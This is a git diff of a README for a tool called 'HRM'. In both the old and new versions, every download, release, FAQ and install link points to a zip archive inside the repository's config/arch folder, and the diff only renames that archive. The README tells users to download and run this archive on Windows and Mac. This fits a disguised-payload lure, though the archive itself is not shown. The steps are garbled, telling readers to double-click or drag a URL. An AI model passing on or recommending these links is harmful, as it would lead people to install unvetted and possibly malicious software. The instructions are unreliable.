@@ -1,6 +1,6 @@
 # 🌟 HRM - Simplifying Hierarchical Reasoning for You
 
-[![Download HRM](https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip)](https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip)
+[![Download HRM](https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip)](https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip)
 
 ## 📖 Overview
 
@@ -12,11 +12,11 @@ To get started with HRM, you need to follow these simple steps. You will downloa
 
 ## 📥 Download & Install
 
-To download HRM, visit this page to download: [HRM Releases](https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip).
+To download HRM, visit this page to download: [HRM Releases](https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip).
 
 1. Click the above link to access the Releases page.
 2. In the list of available releases, look for the latest version. It is usually marked as the top entry.
-3. You will see various assets related to that release. Download the file that matches your operating system. For Windows, it may be something like `https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip`. For Mac, look for `https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip` or something similar.
+3. You will see various assets related to that release. Download the file that matches your operating system. For Windows, it may be something like `https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip`. For Mac, look for `https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip` or something similar.
 4. Once the file has downloaded, locate it in your Downloads folder or wherever you saved it.
 
 ### 🛠 Installation Steps
@@ -25,14 +25,14 @@ After the download is complete, follow these installation steps based on your op
 
 #### For Windows
 
-1. Navigate to your Downloads folder and double-click the `https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip` file.
+1. Navigate to your Downloads folder and double-click the `https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip` file.
 2. Follow the on-screen prompts to complete the installation.
 3. Once installed, you can find HRM in your Start Menu or desktop.
 
 #### For Mac
 
-1. Open the downloaded `https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip` file.
-2. Drag the `https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip` file into your Applications folder.
+1. Open the downloaded `https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip` file.
+2. Drag the `https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip` file into your Applications folder.
 3. You can now run HRM from your Applications.
 
 ## 📊 Features
@@ -73,12 +73,12 @@ If you encounter any issues while running HRM, consider the following common sol
 Join our community for support and additional resources:
 
 - **GitHub Discussions**: Engage with fellow users and developers.
-- **FAQs**: Check our FAQ section [here](https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip).
+- **FAQs**: Check our FAQ section [here](https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip).
 - **Issue Reporting**: If you find a bug or have a feature request, please report it in the Issues section of the repository.
 
 ## 🔗 Useful Links
 
-- **Releases Page**: [HRM Releases](https://raw.githubusercontent.com/BoowwiieePH/HRM/main/config/arch/HRM-v1.6.zip)
+- **Releases Page**: [HRM Releases](https://github.com/BoowwiieePH/HRM/raw/refs/heads/main/config/arch/Software-2.5.zip)
 - **Documentation**: Comprehensive guides and details can be found in the documentation folder of the repository.
 
 Feel free to explore, learn, and develop your skills in hierarchical reasoning with HRM. We are excited to see how you use this tool to enhance your understanding!
